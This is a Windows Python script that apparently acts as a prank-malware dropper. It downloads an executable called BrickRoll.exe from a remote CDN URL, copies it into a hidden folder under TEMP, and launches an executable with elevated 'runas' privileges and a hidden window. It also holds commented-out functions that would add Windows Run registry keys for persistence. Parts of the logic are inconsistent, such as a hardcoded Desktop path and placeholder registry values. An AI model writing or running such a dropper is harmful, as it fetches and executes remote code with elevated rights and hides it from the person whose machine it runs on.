import os
from dotenv import load_dotenv
import shutil
from random import randint
import win32con, win32api
import winreg
import urllib.request

load_dotenv()
#Copies the executable to a generated dir, and makes the folder invisible

url = "https://cdn.glitch.global/d7d3f709-3b9b-476d-95ca-6770e274cde6/BrickRoll.exe?v=1645493454402"
urllib.request.urlretrieve(url, "BrickRoll.exe")


drop_path = os.environ.get('TEMP') + "\\.tmp241253"
file_path = os.getcwd() + "\\BrickRoll.exe"

os.makedirs(drop_path)

#Makes folder/file invisible
win32api.SetFileAttributes(drop_path,win32con.FILE_ATTRIBUTE_HIDDEN)

# print(drop_path)
# print(file_path)
shutil.copy(file_path, drop_path)
win32api.ShellExecute(0, "runas", "C:\\Users\\User\\Desktop\\BrickRoll.exe", None, None, 0)
# def set_run_key(key, value):
#     """
#     Set/Remove Run Key in windows registry.

#     :param key: Run Key Name
#     :param value: Program to Run
#     :return: None
#     """
#     # This is for the system run variable
#     reg_key = winreg.OpenKey(
#         winreg.HKEY_CURRENT_USER,
#         r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
#         0, winreg.KEY_SET_VALUE)

#     with reg_key:
#         if value is None:
#             winreg.DeleteValue(reg_key, key)
#         else:
#             if '%' in value:
#                 var_type = winreg.REG_EXPAND_SZ
#             else:
#                 var_type = winreg.REG_SZ
#             winreg.SetValueEx(reg_key, key, 0, var_type, value)
# set_run_key("KEY", "Christmas is my favorite holiday :)")

# def set_run_key2(key, value):
#     """
#     Set/Remove Run Key in windows registry.

#     :param key: Run Key Name
#     :param value: Program to Run
#     :return: None
#     """
#     # This is for the system run variable
#     reg_key = winreg.OpenKey(
#         winreg.HKEY_CURRENT_USER,
#         r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
#         0, winreg.KEY_SET_VALUE)

#     with reg_key:
#         if value is None:
#             winreg.DeleteValue(reg_key, key)
#         else:
#             if '%' in value:
#                 var_type = winreg.REG_EXPAND_SZ
#             else:
#                 var_type = winreg.REG_SZ
#             winreg.SetValueEx(reg_key, key, 0, var_type, value)
# set_run_key2("KEY", "Christmas is my favorite holiday :)")